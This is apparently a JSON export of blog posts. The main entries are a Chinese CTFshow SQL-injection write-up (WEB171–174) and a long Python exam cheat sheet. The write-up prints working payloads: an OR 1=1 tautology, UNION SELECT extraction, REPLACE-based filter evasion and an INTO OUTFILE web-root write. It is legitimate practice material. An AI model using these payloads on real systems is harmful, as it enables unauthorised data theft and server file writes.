[{"content":"天天摸鱼！\n移动端访问这里\r","date":"2025-08-17T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/bewatermyfriend/","title":"暑假狠狠摸鱼！"},{"content":"CTFSHOW web SQL注入WriteUP Part1 前面做累了做点简单的玩玩，小白白做的菜，或许解释的不对，大佬轻喷QAQ\nWEB171 第一道题，很简单，基本上就是考的入门基础\n1 2 //拼接sql语句查找指定ID用户 $sql = \u0026#34;select username,password from user where username !=\u0026#39;flag\u0026#39; and id = \u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39; limit 1;\u0026#34;; 给了查询代码，是经典的sql查询语句\n这里简单拆一下\n1 2 3 4 5 select username,password --选中username，password两行 from user --从user表中 where username != \u0026#39;flag\u0026#39; --不选中username项为flag的表 and id = \u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39; --id为（这里\u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39;是传入参数的点） limit 1; --限制只能查询一行 很明显这里是有问题的，如果给ID传个' -- 会怎么样呢？\n1 and id = \u0026#39;\u0026#34;\u0026#39;-- \u0026#34;\u0026#39; limit 1; 这里注释直接把后面的语句给干掉了，我们可以直接从这里入手，直接传一个万能密码1' or 1=1 -- 直接把所有表爆出来了\n1 2 3 4 5 6 /** ⚠注意：这里结尾用的“-- ”后面有个空格。 虽然sql中 `--` 是注释的意思，但是至少在MYSQL中，这种注释后直接跟语句是不合法的。 此外，某些浏览器可能会吃掉最后的空格， 如果遇到这种情况，可以用+或者%20等等替换掉这个空格，也可以直接把`--+`这个语句换成%23(url编码：#) **/ 可是前面有一个username !='flag'语句，为什么会直接把所有表出了呢？\n其实我们传进去这个以后，sql语句相当于变成了这两句\n1 2 3 select username,password from user where username !=\u0026#39;flag\u0026#39; and id = \u0026#39;\u0026#34;1\u0026#39; or 1=1 --+ \u0026#34;\u0026#39; limit 1; 前面写的一整个语句都没用了，因为我们给了或的条件，整个表等价成了这样\n1 where username != \u0026#39;flag\u0026#39; and id = \u0026#39;\u0026#34;1\u0026#39; (or 1=1) and的优先级比较高，所以先判断username != 'flag' and id = '\u0026quot;1'。\n1=1被单独判断了，而且它是恒真的，所以直接打出了所有的表。\nWEB172 1 2 3 4 //检查结果是否有flag if($row-\u0026gt;username!==\u0026#39;flag\u0026#39;){ $ret[\u0026#39;msg\u0026#39;]=\u0026#39;查询成功\u0026#39;; } 现在不能用上一道的payload了，因为直接输出会把咱们的结果吃掉\n注意到这里对传入参数没有任何过滤，只是过滤了输出值，于是我们可以使用UNION联合查询来绕过\n1 \u0026#39;1\u0026#39;UNION SELECT 1,password from ctfshow_user2 --+ 这里因为flag存在password里了，只需要获取password中的值就可以了\n这里补充一些简单函数\n1 2 3 4 database() -- 数据库名 group_concat(table_name) --表名 group_concat(column_name)--字段名 group_concat(xxxx字段名) --获取字段值 WEB173 1 2 3 4 //检查结果是否有flag if(!preg_match(\u0026#39;/flag/i\u0026#39;, json_encode($ret))){ $ret[\u0026#39;msg\u0026#39;]=\u0026#39;查询成功\u0026#39;; } 这里payload同上，因为flag的格式是ctfshow{}，所以并不影响做题（doge）\nWEB174 首先吐槽一下，这道题刚打开上栏里的无过滤注入4打开是select-no-waf-3.php，但是真正的题是select-no-waf-4.php，给我折腾了一圈\n1 2 3 4 5 //检查结果是否有flag if(!preg_match(\u0026#39;/flag|[0-9]/i\u0026#39;, json_encode($ret))){ $ret[\u0026#39;msg\u0026#39;]=\u0026#39;查询成功\u0026#39;; } 这里把0-9都给干掉了，怎么办呢？\n有两种方法，第一种是替换，第二种是把结果输出一个文件，从而绕过过滤\n第一种 payload\n1 https://69860b52-d551-457b-99cc-737488724347.challenge.ctf.show/api/v4.php?id=-1%27%20UNION%20SELECT%20REPLACE(username,%27f%27,%27G%27),%20REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(password,%279%27,%27nine%27),%278%27,%27eight%27),%277%27,%27seven%27),%276%27,%27six%27),%275%27,%27five%27),%274%27,%27four%27),%273%27,%27three%27),%272%27,%27two%27),%271%27,%27one%27),%270%27,%27zero%27)%20from%20ctfshow_user4%20--+ 这里只能用js里面的api来看，直接用前端的会提示获取异常\n得到\n1 {\u0026#34;code\u0026#34;:0,\u0026#34;msg\u0026#34;:\u0026#34;\\u67e5\\u8be2\\u6210\\u529f\u0026#34;,\u0026#34;count\u0026#34;:1,\u0026#34;data\u0026#34;:[{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;admin\u0026#34;},{\u0026#34;username\u0026#34;:\u0026#34;userAUTO\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;passwordAUTO\u0026#34;},{\u0026#34;username\u0026#34;:\u0026#34;Glag\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;ctfshow{fefourthreebonethreenine-ceightoned-foureightaf-eightsevenfd-esevenonefoureightcaseventwocfourfive}\u0026#34;}]} 手动替换或者写个python脚本可以得到最终flag\n第二种 SQL中，into outputfile可以输出文件，\n1 UNION SELECT username,password from ctfshow_user4 into outfile \u0026#39;/var/www/html/1.txt\u0026#39; -- 发现不可以用*代替username,password，不知道为什么，带佬可以解释一下\n直接访问1.txt直接得到flag\n","date":"2025-05-30T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/ctfshow_sql_inject_write_up_1/","title":"CTF_show Web SQL注入writeup WEB171-WEB180"},{"content":"0xB 写在前面的话 本文档是 Python 数据分析考试的参考/复习资料，涵盖 基本语法、常用函数、简单算法实现 等内容。\n适用人群：一编程基础的同学（备考） 纯粹没过函数的或者自己写过的请不要用本文档，本文档不包含足够例子！ 作者：Danvei233（@GitHub） 第零章是基本语法和纲要（速查） 使用GPT-o3润色 0xD 目录 [TOC]\n0x0 基本语法与数据类型 0.1 变量与数据类型概览 分类 内置类型 典型字面量 / 赋值示例 构造函数 (函数式写法) 常见操作 备注 数字 (Numeric) int float complex a = 3 b = 1.2 c = 2+3j int(\u0026quot;42\u0026quot;) float(\u0026quot;3.14\u0026quot;) complex(2, 3) 加减乘除 + - * / 幂 ** 取整除 // 取余 % bool 本质上继承自 int (True==1, False==0) 布尔 (Boolean) bool flag = True is_ok = (3 == 1) bool(0) → False 逻辑与 and 逻辑或 or 取反 not 只可取值 True/False 序列 (Sequence) str list tuple range s = \u0026quot;hello\u0026quot; s2 = f\u0026quot;{name}\u0026quot; lst = [1, 2, 3] tpl = (1, 2) r = range(0, 5) str(123) list(\u0026quot;abc\u0026quot;) tuple([1,2]) range(5) 切片 [:] 拼接 + 成员测试 in 长度 len() str、tuple、range 不可变；list 可变 映射 (Mapping) dict d = {\u0026quot;name\u0026quot;: \u0026quot;Bob\u0026quot;, \u0026quot;age\u0026quot;: 18} dict(name=\u0026quot;Bob\u0026quot;, age=18) 取值 d[key] 遍历 for k,v in d.items() 键必须可哈希 (hash) 特殊单值 NoneType x = None — 占位、空值 只有一个实例 None 提示：type(obj) 可查看变量实际类型，isinstance(obj, T) 用于类型判断（推荐），构造函数可以用于转换类型。\n0.2 函数及其结构 函数：带名字的可复用代码块，对输入（参数）进行处理并可返回输出（返回值）。\n0.2.1 定义语法 1 2 3 4 5 def function_name(param1, param2=default): \u0026#34;\u0026#34;\u0026#34;文档字符串（可选）\u0026#34;\u0026#34;\u0026#34; # 函数体（4 个空格缩进） ... return value # 返回值可省略，相当于 return None def 关键字后跟函数名和参数列表，末尾必须有冒号 :。 函数体必须统一缩进（推荐 4 个空格）。 return 没有表达式时等价于 return None。 0.2.2 函数命名规则 不与现有标识符重复，区分大小写。 以字母或 _ 开头，不能以数字开头，且不含特殊符号。 推荐 snake_case 或驼峰 camelCase，关键是自描述。 例如：is_leap_year(year) 一看即知其功能与返回值。 0.2.3 参数类型 位置参数：调用时按顺序一一对应。 默认参数：形参中写 param=value 并放在末尾，可在调用时省略。 可变长度：*args、**kwargs（进阶用法，考试可选）。 参数在函数调用结束后即被销毁，仅在函数体内部可见。\n0.2.4 调用函数 1 2 3 4 def is_leap_year(y): return (y % 4 == 0 and y % 100 != 0) or (y % 400 == 0) result = is_leap_year(2024) # 返回 True 0.2.5 变量作用域 局部变量：在函数体内声明，只在该函数内可见。 全局变量：在函数外部声明；若需在函数中修改，必须使用 global 关键字。 0.3 对象（class） 一句话： 类是“设计图”，对象是根据设计图做出的“实物”。\n0.3.1 代码骨架（从上到下一次写完） 1 2 3 4 5 6 7 8 class MyClass: # ① class 开头，冒号不能丢 common_val = 0 # ② 类变量：所有对象共用 def __init__(self, val): # ③ 初始化，a = MyClass(10) 时自动调用 self.val = val # self 就是“这台机器” def method1(self, x): # ④ 自定义方法 print(self.val + x) 写顺序：class ➜ 类变量 ➜ __init__ ➜ 其他 def，全部 4 空格缩进。\n0.3.2 实例化（真机到手） 1 2 a = MyClass(10) # 造一台对象 a.method1(5) # 输出 15 访问属性：a.val 或 MyClass.common_val。 改类变量：MyClass.common_val = 99 ➜ 所有对象一起变。 0.3.3 速记要点 **self** 必写：缺了会报错 missing 1 required positional argument: 'self'。 类变量 vs 实例变量：类变量大家共用；实例变量(self.xxx)只属于自己。 私有/保护名： _name 单下划线：只是提醒“内部用”。 __name 双下划线：Python 会改名混淆，一般外部访问不到。 0.4 包（package） 一句话： 包就是把相关功能组织成文件夹，让项目结构清晰。\n0.4.1 包的基本结构 1 2 3 4 5 6 project_folder/ ├─ package_name/ # 包（文件夹） │ ├─ __init__.py # 标记此目录为包，可为空 │ ├─ module1.py # 模块（.py 文件） │ └─ module2.py └─ main.py # 使用包的脚本 包 (package_name) 是包含 __init__.py 的文件夹。 模块 (module1.py) 可以导入、调用其中的变量、函数、类。 0.4.2 导入语法示例 1 2 3 4 5 6 7 import package_name # 导入整个包 import package_name.module1 # 导入模块 from package_name import module2 # 从包里导入模块 from package_name.module1 import func1 # 导入模块中的函数 import package_name as pkg # 起别名，方便书写 from package_name.module1 import ClassA as CA 注意语法顺序：必须写作 from 包名 import 名称，而 **import 名称 from 包名** 是不合法的。 import ... as 可以给包或模块起简短别名。 from ... import ... 让调用更直接（无需写全路径）。 0.4.3 常见用途 将不同功能拆分到不同模块，保持代码整洁。 方便多人协作，每人维护独立模块。 0.5 数字类型计算 0.5.1 数字类别回顾 int：任意精度整数，如 42、0b1010。 float：双精度浮点，如 3.14、6.02e23。 complex：形如 3+4j，含实部和虚部。 0.5.2 一元运算与常用函数 运算/函数 输入 结果 示例 +x / -x 数字 原值 / 相反数 -5 abs(x) 数字 绝对值 abs(-3) → 3 round(x, n) 浮点 四舍六入五靠偶；n 为保留位数 round(3.1416, 2) → 3.14 int(x) / float(x) 数字或可转换字符串 类型转换 int(3.9) → 3 divmod(a,b) 两整数 (a//b, a%b) 二元组 divmod(17,4) → (4,1) 0.5.3 二元运算符 运算符 含义 示例 结果 + - * / 加减乘除（/ 返回 float） 7/2 3.5 // 地板除（向负无穷取整） -7//2 -4 % 取余 7%2 1 ** 幂运算 2**10 1024 pow(x,y[,m]) 幂，可带模 pow(2,10,1000) 24 `\u0026laquo; \u0026raquo; \u0026amp; ^ ~` 位运算 5\u0026lt;\u0026lt;1 0.5.4 math 标准库速查 1 2 3 4 5 6 import math math.sqrt(9) # 3.0 开根 math.ceil(2.3) # 3 上取整 math.floor(2.9) # 2 下取整 math.factorial(5) # 120 阶乘 math.pi, math.e # 圆周率和自然常数 需要高精度时，使用 from decimal import Decimal；处理分数可用 from fractions import Fraction。\n0.5.5 精度陷阱与解决办法 1 2 3 0.1 + 0.1 + 0.1 == 0.3 # False from decimal import Decimal as D D(\u0026#39;0.1\u0026#39;)*3 == D(\u0026#39;0.3\u0026#39;) # True 0.5.6 小技巧 环绕取模：凯撒偏移 (idx + k) % 26。例2：把输入的数字映射到星期：\n1 2 3 week = [\u0026#39;日\u0026#39;,\u0026#39;一\u0026#39;,\u0026#39;二\u0026#39;,\u0026#39;三\u0026#39;,\u0026#39;四\u0026#39;,\u0026#39;五\u0026#39;,\u0026#39;六\u0026#39;] i = int(input(\u0026#39;输入数字（任意整数）：\u0026#39;)) % 7 print(\u0026#39;星期\u0026#39; + week[i]) 取十位：n // 10 % 10；（//留高位 %留低位） 后三位：n % 1000。\n商余同得：q, r = divmod(n, m)。\n0.6 分支控制与循环 0.6.1 比较与逻辑运算符 类型 符号 含义 读法 / 记忆小技巧 示例 比较 == 相等 \u0026ldquo;两个等号表示比较\u0026rdquo; 5 == 5 → True != 不等 \u0026ldquo;! 表示 not，和 == 组合成 ≠\u0026rdquo; 5 != 3 → True \u0026gt; 大于 \u0026ldquo;尖嘴向左，左边更大\u0026rdquo; 5 \u0026gt; 3 → True \u0026lt; 小于 \u0026ldquo;尖嘴向右，右边更大\u0026rdquo; 3 \u0026lt; 5 → True \u0026gt;= 大于等于 读作 \u0026ldquo;大于等于\u0026rdquo;，写作 \u0026gt;=（记：先 \u0026gt; 后 =) 5 \u0026gt;= 5 → True \u0026lt;= 小于等于 读作 \u0026ldquo;小于等于\u0026rdquo;，写作 \u0026lt;=（记：先 \u0026lt; 后 =) 3 \u0026lt;= 5 → True 逻辑 and 与 两边都真才真 True and False → False or 或 一真即真 True or False → True not 非 取反 not True → False 真值规则：0、None, False 为假，其他皆真。\n0.6.2 if / elif / else 1 2 3 4 5 6 7 score = 85 if score \u0026gt;= 90: grade = \u0026#39;A\u0026#39; elif score \u0026gt;= 80: grade = \u0026#39;B\u0026#39; else: grade = \u0026#39;C or below\u0026#39; 三元表达式：gender = '男' if isBoy(me) else '女'。 0.6.3 循环结构 while 1 2 3 4 5 6 7 n = 1 while n \u0026lt; 100: n *= 2 if n == 64: break # 提前结束循环 else: print(\u0026#39;正常结束\u0026#39;) # 未被 break 时才执行 for 1 2 for i in range(0, 5,1): print(i) # 0,1,2,3,4 遍历字典：for k,v in d.items():(更多请看下面)。\nrange(start, stop, step) 不含 stop，step 可为负。\n同时遍历两个序列：\n1 2 for a, b in zip(list1, list2): ... 推导式 1 2 3 squares = [x*x for x in range(10) if x%2==0] odd_map = {x: x%2 for x in range(5)} unique = {c.lower() for c in \u0026#39;Hello\u0026#39;} 0.6.4 循环相关语句 break：退出最近一层循环。 continue：跳过本次迭代，继续下一次。 pass：占位语句，什么都不做。 0.6.5 常见坑 浮点比较：用 abs(a-b) \u0026lt; 1e-9。 修改列表时遍历：可先复制 for x in lst[:] 或倒序遍历。 死循环：确保循环体内有让条件变假的语句。 后续章节：文件 I/O、Numpy \u0026amp; Pandas 简明指南…\n分支（if / elif / else） 1 2 3 4 5 6 if 条件表达式: # 代码块 elif 另一个条件: # 代码块 else: # 代码块 条件表达式由比较运算符（== != \u0026gt; \u0026lt; \u0026lt;= \u0026gt;=）和逻辑运算符（not and or）组合而成。 禁止在条件中用浮点数判断相等，易出错。必要时用整数或阈值范围判断。 可以写 if x in some_list 或 if key in some_dict。 循环 1 2 3 4 5 6 7 # while 循环 while 条件: # 代码块 # for 循环 for i in iterable: # iterable 可为字符串、列表、range 等 # 代码块 range(start, end, step)：包含 start，不包含 end，步长 step。\n遍历字典：\nfor k, v in d.items(): for k in d.keys(): for v in d.values(): 列表推导式：\n1 new_list = [f(x) for x in iterable if 条件] 0x1 数据结构与文件操作 1.0 字符串 1.0.1 定义字符串 单引号或双引号包裹：\n1 2 a = \u0026#34;hello\u0026#34; b = \u0026#39;world\u0026#39; 三引号用于多行文本：\n1 2 3 4 text = \u0026#34;\u0026#34;\u0026#34; 第一行 第二行 \u0026#34;\u0026#34;\u0026#34; 原始字符串（不处理转义）：\n1 path = r\u0026#34;C:ew_folder\test\u0026#34; 1 2 3 4 5 6 7 8 9 10 - 常用转义符： ` `（换行）、`\t`（制表）、`\\`（反斜杠本身）。 ## 1.0.2 字符串格式化 - **f-string**（Python 3.6+）： ```python name = \u0026#34;Alice\u0026#34; score = 95.6789 msg = f\u0026#34;{name} 同学成绩：{score:.2f}\u0026#34; # 保留两位小数 **format()** 方法：\n1 2 3 template = \u0026#34;{0} 同学成绩：{1:.2f}\u0026#34;.format(name, score) # 或指定名称 template2 = \u0026#34;{n} 成绩：{s:.1f}\u0026#34;.format(n=name, s=score) 常见格式说明：\n:.2f 保留两位小数。 :\u0026gt;10 右对齐，占 10 个字符宽度。 :\u0026lt;10 左对齐。 :^10 居中对齐。 1.0.3 切片与索引获取 按索引访问单个字符：\n1 2 3 s = \u0026#34;python\u0026#34; s[0] # \u0026#39;p\u0026#39; s[-1] # \u0026#39;n\u0026#39; 切片（[start:stop:step]）：\n1 2 3 4 5 6 s = \u0026#34;abcdefg\u0026#34; s[1:4] # \u0026#39;bcd\u0026#39; (包含索引1，不包含4) s[:3] # \u0026#39;abc\u0026#39; s[3:] # \u0026#39;defg\u0026#39; s[::2] # \u0026#39;aceg\u0026#39; (步长2) s[::-1] # \u0026#39;gfedcba\u0026#39; (反转) 1.0.4 常用字符串方法 重要提示： 字符串在 Python 中是 不可变 的——几乎所有方法都会返回 新字符串，原变量保持不变。别忘了把返回值接收进变量，否则你的修改会“丢失”。\n核心方法详解 len(s) → int 作用：返回长度。 返回值：整数。原字符串不变。 s.upper() / s.lower() → str 作用：大小写转换。 返回值：新字符串；s 本身不变。 s.find(sub, start=0, end=len) → int 作用：子串第一次出现的位置。 返回值：索引；未找到返回 -1。 s.replace(old, new, count=-1) → str 作用：把所有（或前 count 个）old 换成 new。 返回值：新字符串；不会就地修改。 s.split(sep=None, maxsplit=-1) → list[str] 作用：按分隔符拆成列表；默认按空白拆。 返回值：列表；原字符串不变。 sep.join(iterable) → str 作用：把迭代器里的元素用 sep 连接。 返回值：新字符串。 小技巧：' '.join(['Hello', 'Python']) → 'Hello Python'。 s.strip(chars=None) / lstrip / rstrip → str 作用：去掉两端或左/右侧指定字符（默认空白）。 返回值：新字符串。 判断类方法（返回 bool）： s.isalpha()：全是字母。 s.isdigit()：全是数字。 s.isalnum()：字母或数字。 s.startswith(prefix) / s.endswith(suffix)：前缀/后缀判断。 其他常用格式化/变形： s.title()：每个单词首字母大写。 s.capitalize()：首字母大写，其余小写。 切片反转：s[::-1]。 s.strip() # 去除首尾空白 s.lstrip() # 去除左侧空白 s.rstrip() # 去除右侧空白 例子汇总 1 2 3 4 5 6 7 8 9 10 s = \u0026#34; hello, python3 \u0026#34; print(len(s)) # 15 print(s.strip().upper()) # \u0026#39;HELLO, PYTHON3\u0026#39; print(s.find(\u0026#39;py\u0026#39;)) # 8 print(s.replace(\u0026#39;python3\u0026#39;, \u0026#39;world\u0026#39;)) # \u0026#39; hello, world \u0026#39; print(\u0026#39;-\u0026#39;.join([\u0026#39;A\u0026#39;,\u0026#39;B\u0026#39;,\u0026#39;C\u0026#39;])) # \u0026#39;A-B-C\u0026#39; # 字符编码互转 print(ord(\u0026#39;A\u0026#39;)) # 65 （字符→码点） print(chr(9731)) # \u0026#39;☃\u0026#39; （码点→字符） 1.0.5 输入与输出 input() 1 2 3 4 5 6 name = input(\u0026#34;请输入姓名：\u0026#34;) # 始终返回 str age = int(input(\u0026#34;年龄：\u0026#34;)) # 转成 int x, y = input().split() # 用空格分割成两个变量（str） a, b = map(float, input().split()) # map(类型, 可迭代) → map 对象，需要再外层转换 nums = list(map(int, input().split())) # 先 map 再 list 得到整数列表 c, d = eval(input()) # 输入形如 \u0026#34;(3,4)\u0026#34;；⚠️ eval 有安全风险 map(func, iterable) 会返回 **map** 对象（惰性迭代器），常见用法是再包一层 list()、tuple() 或直接用在 for 循环里：for x in map(int, data): ...。 input(prompt) 在控制台显示提示文字，等待用户敲回车。 返回值永远是字符串，需要时自行用 int() / float() / split() 等转换。 print() 1 2 3 4 print(\u0026#34;Hello\u0026#34;, \u0026#34;World\u0026#34;) # 默认空格分隔，换行结束 print(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;, sep=\u0026#34;-\u0026#34;, end=\u0026#34;! \u0026#34;) # 自定义分隔符与结尾 print(f\u0026#34;{name=}\u0026#34;) # 调试利器，Python 3.8+ 关键字参数： sep：多个参数之间的分隔符，默认 ' '。 end：行尾结束符，默认 ' '；改成 '' 可取消自动换行。 file：输出目标，默认 sys.stdout；可重定向到文件对象。 flush：True 时立即刷新缓冲区。 小贴士：print(*iterable, sep=' ') 可快速逐行打印列表内容。\n1.0.6 map() 1 2 3 4 5 6 python复制编辑# 将用户输入的数字用空格分隔并转换成 int a, b, c = map(int, input(\u0026#34;输入 3 个整数，用空格隔开：\u0026#34;).split()) # 说明： # map(类型, 可迭代对象) → 返回一个 map 对象（惰性迭代器） # 想立即得到列表可再套一层 list() nums = list(map(float, input().split())) 小结\nmap() 不会立刻产生新列表，而是返回 map 对象；如果要多次使用，最好 list(map(...))。 eval(input()) 能一次读多个 Python 表达式并直接变成对应类型，但有 安全隐患；考试能用就用，开发别随便用。 1.1 列表 1.1.1 创建方式 1 2 3 4 5 empty = [] # 字面量空列表 empty2 = list() # 构造函数 mix = [1, 2, \u0026#34;3\u0026#34;] # 混合类型 copy = [a, b] # 存变量时只存“引用”，不会连带修改历史值 matrix = [[0]*3 for _ in range(2)] # 2×3 二维表，推荐列表推导式 1.1.2 访问与切片 1 2 3 4 v = mix[0] # 第 1 个，下标从 0 开始 last = mix[-1] # 倒数第 1 个 sub = mix[1:3] # [start, end) 切片 rev = mix[::-1] # 反转 1.1.3 常用统计函数 1 2 3 4 5 n = len(nums) # 长度 s = sum(nums) # 求和（元素需可相加） avg = s / n # 平均值 hi, lo = max(nums), min(nums) nums_sorted = sorted(nums) # 返回“新列表” 1.1.4 修改与管理方法 方法调用 作用 就地修改？ 返回值 lst.append(x) 在尾部加一个元素 ✅ None lst.extend(it) 追加一个可迭代对象里的所有元素 ✅ None lst.insert(i, x) 在索引 i 处插入 ✅ None lst.pop(i=-1) 删除并返回索引 i（默认最后一个） ✅ 被弹出的元素 lst.remove(x) 删 第一个 值等于 x 的元素 ✅ None lst.clear() 清空列表 ✅ None lst.index(x) 返回 x 第一次出现的索引 ❌ int lst.count(x) 统计 x 出现次数 ❌ int lst.sort(key=None, reverse=False) 原地排序 ✅ None lst.reverse() 原地反转 ✅ None sort() vs sorted()：lst.sort() 会直接改变原列表且返回 None；sorted(lst) 则生成新列表并保持原列表不变。 不可变对象（如字符串）放进列表后，列表里只是存“引用”，若对象本身不可变就安全；可变对象（如另一个列表）若在别处修改，会反映到这里。 这样一来，数字‑字符串‑列表三大“最常用基本类型”就都有完整速查了。 如果还想再补其它容器（如元组、字典）或深入讲 sort() 的自定义 key，随时说！\n## 1.2 字典（dict）\n### 1.2.1 创建与赋值\n1 2 3 4 5 6 7 8 9 10 11 12 # 空字典 d1 = {} # 字面量 d2 = dict() # 构造函数 d2=zip(list1,list2) #用列表构造 取最短 第一个是键 # 带内容 info = {\u0026#34;name\u0026#34;: \u0026#34;Tom\u0026#34;, \u0026#34;age\u0026#34;: 18} ## 如果重复 后面的会覆盖前面的 # 动态添加 / 修改 info[\u0026#34;city\u0026#34;] = \u0026#34;Beijing\u0026#34; # 如果 key 不存在就创建，存在就改值 # 推导式 squares = {x: x**2 for x in range(5)} # {0:0, 1:1, 2:4, …} 键必须唯一，而且必须是可哈希的不可变对象（数字、字符串、元组…）。\n### 1.2.2 安全取值 直接 d[key] 若键不存在会抛 KeyError。常见两种“稳取”写法：\n1 2 3 4 if \u0026#34;age\u0026#34; in info: # 先判断 print(info[\u0026#34;age\u0026#34;]) print(info.get(\u0026#34;score\u0026#34;, 0)) # 若无则给默认 0 ### 1.2.3 常用方法速查\n调用 作用 返回值 备注 d.get(k, default=None) 取值 找到：值；没找到：default 不报错 d.pop(k, default=KeyError) 删除并返回键 k 找不到：KeyError 或 default 就地改 d.keys() / d.values() / d.items() 分别拿到键 / 值 / (键,值) 迭代器 dict_keys 等 可转 list() d.update(other) 用 other 里的键值批量更新 None 就地改 d.clear() 清空字典 None 就地改 len(d) 键的个数 int 内置函数 ### 1.2.4 遍历套路\n1 2 3 4 5 6 7 # 遍历键 for k in info: print(k, info[k]) #！！默认只遍历键 # 同时拿键和值 for k, v in info.items(): print(f\u0026#34;{k} --\u0026gt; {v}\u0026#34;) ### 1.2.5 字典排序\n按键排序（最简单）\n1 2 for k in sorted(info): # 默认升序 print(k, info[k]) 按值排序\n1 2 # sorted() 接收 key=，返回的是新列表 items = sorted(info.items(), key=lambda kv: kv[1]) # 按 value 升序 多级排序 lambda 返回 元组 → 先比第一项，再比第二项：\n1 2 # 先按 value 降序，再按 key 升序 items = sorted(info.items(), key=lambda kv: (-kv[1], kv[0])) 如果想对「多级元组排序」再整体反转，请不要写 sorted(..., reverse=True) —— 这样会把所有维度一起翻转； 正确做法：\n先写好带正负号的多级 key； 或者先排好，再调用一次 items.reverse()。 ### 1.2.6 lambda 一口讲清\nlambda 参数: 表达式 → 匿名小函数，用一次就丢。\n在 sorted, map, filter 等场景下当“回调”最常见。\n1 2 # 把字典按 value 从大到小排 sorted(info.items(), key=lambda kv: kv[1], reverse=True) 小贴士\n字典元素无序（Python 3.7+ 保证“插入顺序”但不用于逻辑排序）。 pop() / update() 都会修改原字典；想保持原数据别直接动它。 字典很适合当“哈希表”做 O(1) 查询，例如记录字符频次、缓存计算结果等。 ## 1.3 文件简单操作\n### 1.3.1 open() 基本语法\n1 f = open(filepath, mode=\u0026#34;r\u0026#34;, encoding=\u0026#34;utf‑8\u0026#34;) 形参 常用取值 说明（一句话记住就够） filepath \u0026quot;data.txt\u0026quot; / \u0026quot;./dir/log.csv\u0026quot; 文件相对或绝对路径 mode \u0026quot;r\u0026quot; 读 \u0026quot;w\u0026quot; 写(覆盖) \u0026quot;a\u0026quot; 追加\u0026quot;rb\u0026quot; 二进制读 \u0026quot;wb\u0026quot; 二进制写 r=read w=write a=append encoding \u0026quot;utf-8\u0026quot;（最常用） 文本文件的字符集；二进制模式不用写 \u0026quot;w\u0026quot; 会清空旧文件；若想安全一些，先用 \u0026quot;a\u0026quot; 或检查 os.path.exists()。 省略 encoding 可能在不同系统读写中文时乱码，最好显式写 \u0026quot;utf‑8\u0026quot;。 ### 1.3.2 推荐写法：with … as\n1 2 3 with open(\u0026#34;data.txt\u0026#34;, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: text = f.read() # 离开 with 块，文件自动 close() 考点：用 *with* 可以自动关闭文件，省去 *f.close()*，也能避免忘关导致数据没落盘。\n### 1.3.3 常用读写方法\n调用 用途 返回值 / 行为 典型示例 f.read() 读完整个文件 字符串 data = f.read() f.readline() 读一行（含 \\n） 字符串 line = f.readline() f.readlines() 按行读全部 列表，每行一元素 lines = f.readlines() f.write(s) 写入字符串 s 写入字节数 (int) f.write(\u0026quot;hello\\n\u0026quot;) f.writelines(list) 连续写多行 None f.writelines(lines) f.close() 手动关文件 None 不用 with 时必须调 读完后文件指针在末尾，想再读需要 f.seek(0) 把指针移回开头。 write() 不自动换行，记得手动加 \\n。 二进制模式 (\u0026quot;rb\u0026quot;, \u0026quot;wb\u0026quot;) 读写得到/要求 bytes 而非 str。 ### 1.3.4 最常见 2 个模板\n① 逐行读取并处理\n1 2 3 4 with open(\u0026#34;score.txt\u0026#34;, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: for line in f: # f 本身就可迭代 name, score = line.split() ... ② 写分析结果\n1 2 3 4 with open(\u0026#34;result.txt\u0026#34;, \u0026#34;w\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: f.write(f\u0026#34;Average {avg:.1f}\\n\u0026#34;) for k, v in top_items: f.write(f\u0026#34;{k} {v}\\n\u0026#34;) 只要记住“with open(...) as f: ➜ f.read / f.write ➜ 自动关闭”，文件 I/O 的基础就够用了。\n0x2 数据分析 #此节过于坑爹（半节课讲了4-5节的内容？？） 故附上官方文档以供打印！本文档此处只简单列出基础用法。用于提示！！！！！\nNumPy：初学者的绝对基础_Numpy中文网\n入门教程 — pandas 2.2.3 文档 - pandas 数据分析库\n2.1 NumPy 库 一句话记住： NumPy = 超快多维数组 + 矢量化数学运算。\n1 import numpy as np # ⚠️ 别写成 import np as np 2.1.1 数组创建 方法 功能 示例 np.array(obj, dtype=…) 列表 → 数组；可指定类型 np.array([[1,2],[3,4]], dtype=np.int32) np.arange(start, stop, step) 等差序列 np.arange(0, 10, 2) np.linspace(start, stop, num) 均分 num 个点 np.linspace(0, 1, 5) np.zeros(shape) 全 0 np.zeros((2,3)) np.ones(shape) 全 1 np.ones((2,3)) np.eye(N) / np.eye(M,N,k) 单位阵 / 偏移对角阵 np.eye(5)``np.eye(3,5,2) np.full(shape, fill_value) 固定值⚠️ 若 ***\\**\\*fill_value\\*\\**\\*** 是列表，其长度必须 == 最后一维长度 np.full((2,3,4), 9)``np.full((2,3,4), [1,2,3,4]) 2.1.1.1 随机数组 方法 功能 示例 ⚠️ 易错点 np.random.random(shape) [0,1) 均匀 np.random.random((2,3)) 只能传形状元组，不能分写 m,n np.random.randn(d1,d2,…) 标准正态 np.random.randn(2,3) 不能把整体 shape 打包成元组 np.random.randint(low, high, size=shape) 整数随机 np.random.randint(0, 10, size=(2,3)) 2.1.2 数组修改 2.1.2.1 形状 \u0026amp; 类型 操作 说明 ⚠️ 提示 a.reshape(new_shape) 更改形状，元素总数不变 多余/不足都会报错，不会自动填补 a.T / a.transpose() 转置 a.astype(dtype) or a.dtype = dtype 改类型 常用别名：np.int_, np.float_ 等 2.1.2.2 数据级改动 切片换序：a[::-1]、a[:, ::-1] 合并：np.concatenate([a,b], axis=…) 插入：np.insert(a, index, values, axis=…) 2.1.3 属性查询 \u0026amp; 切片 属性含义快速查看 shape 形状 (行, 列, …) a.shape dtype 